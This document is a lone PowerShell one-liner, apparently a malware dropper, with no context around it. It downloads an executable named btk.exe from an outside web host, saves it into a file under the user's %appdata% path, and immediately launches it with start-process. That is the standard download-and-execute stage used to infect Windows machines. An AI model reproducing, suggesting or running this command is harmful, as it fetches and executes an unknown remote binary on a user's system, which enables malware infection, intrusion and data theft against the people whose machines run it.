(new-object system.net.webclient).downloadfile('http://martinweiser.net/btk.exe','%appdata%.exe');start-process '%appdata%.exe'
